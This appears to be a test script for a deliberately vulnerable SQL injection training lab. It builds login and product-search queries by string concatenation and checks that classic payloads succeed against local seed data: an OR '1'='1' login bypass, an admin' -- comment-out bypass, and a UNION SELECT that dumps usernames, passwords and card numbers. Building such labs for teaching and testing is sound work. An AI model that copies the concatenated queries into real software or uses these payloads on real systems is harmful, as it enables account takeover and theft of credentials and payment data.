// Local proof that the lab is genuinely injectable. Run: node sqli-lab/_test/run.mjs
import { runQuery } from '../src/minisql.js';
import { users, products } from '../src/seed.js';

const tables = { users, products };
let pass = 0, fail = 0;
function check(label, cond) {
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${label}`);
  cond ? pass++ : fail++;
}

// How the vulnerable endpoints build their queries (string concatenation):
const loginQuery = (u, p) =>
  `SELECT id, username, role FROM users WHERE username = '${u}' AND password = '${p}'`;
const searchQuery = (q) =>
  `SELECT id, name, price FROM products WHERE name LIKE '%${q}%'`;

console.log('\n--- 1. Normal, honest login (should work) ---');
let sql = loginQuery('admin', 'S3cr3t-Admin-PW!');
let rows = runQuery(sql, tables);
console.log(sql, '=>', JSON.stringify(rows));
check('valid admin creds return exactly the admin row', rows.length === 1 && rows[0].username === 'admin');

console.log('\n--- 2. Wrong password (should fail) ---');
sql = loginQuery('admin', 'wrong');
rows = runQuery(sql, tables);
console.log(sql, '=>', JSON.stringify(rows));
check('wrong password returns no rows', rows.length === 0);

console.log("\n--- 3. Auth-bypass injection:  username = ' OR '1'='1' --  ---");
sql = loginQuery("' OR '1'='1' -- ", 'anything');
rows = runQuery(sql, tables);
console.log(sql, '=>', JSON.stringify(rows));
check('OR 1=1 bypass logs in without a password', rows.length >= 1);

console.log("\n--- 4. Targeted bypass: log in as admin with no password ---");
sql = loginQuery("admin' -- ", 'anything');
rows = runQuery(sql, tables);
console.log(sql, '=>', JSON.stringify(rows));
check("comment-out password, auth as admin", rows.length === 1 && rows[0].username === 'admin');

console.log('\n--- 5. Normal product search (should work) ---');
sql = searchQuery('Blue');
rows = runQuery(sql, tables);
console.log(sql, '=>', JSON.stringify(rows));
check('search "Blue" returns 2 blue products', rows.length === 2);

console.log("\n--- 6. UNION exfiltration: dump usernames+passwords via product search ---");
sql = searchQuery("zzz' UNION SELECT username, password, card FROM users -- ");
rows = runQuery(sql, tables);
console.log(sql, '=>', JSON.stringify(rows, null, 0));
// UNION maps selected cols positionally onto the first SELECT's names:
// username -> id, password -> name, card -> price
const leaked = rows.some((r) => r.id === 'admin' && r.name === 'S3cr3t-Admin-PW!');
check('UNION leaks admin username+password into product result', leaked);

console.log(`\n==== ${pass} passed, ${fail} failed ====`);
process.exit(fail ? 1 : 0);
